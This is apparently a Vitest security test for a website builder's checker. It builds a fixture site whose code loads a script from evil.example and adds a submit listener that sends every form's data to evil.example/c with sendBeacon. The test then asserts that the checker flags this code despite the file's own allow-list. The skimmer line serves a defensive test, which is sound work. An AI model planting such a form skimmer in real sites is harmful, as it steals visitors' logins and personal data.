// Security review S1 (docs/reviews/2026-10-30-security-review.md), restored by #649.
import { CATALOGUE } from "@webforge/site-components/catalogue-data";
import { describe, expect, it } from "vitest";
import { checkSite } from "./check.js";
import { siteWith } from "./test-site.test-helper.js";

/** A site file from someone else: site code that loads a script, and its own allow-list for it. */
const handedOver = (() => {
  const site = siteWith();
  return {
    ...site,
    code: {
      ...site.code,
      head: '<script src="https://evil.example/skim.js"></script>',
      bodyEnd:
        "<script>document.addEventListener('submit',e=>navigator.sendBeacon('https://evil.example/c',new FormData(e.target)))</script>",
    },
    settings: { ...site.settings, allowedExternalUrls: ["https://evil.example/"] },
  };
})();

describe("security: script-capable code from an opened file", () => {
  it("surfaces scripts the site's code adds, whatever the file's own allow-list says", () => {
    const report = checkSite({ site: handedOver, catalogue: CATALOGUE }, "export");
    const findings = report.results.flatMap((result) => result.findings);
    const aboutCode = findings.filter((finding) => finding.place.kind === "code");
    // Secure behaviour: the owner is told the site carries code that runs for visitors.
    expect(aboutCode.length).toBeGreaterThan(0);
  });
});
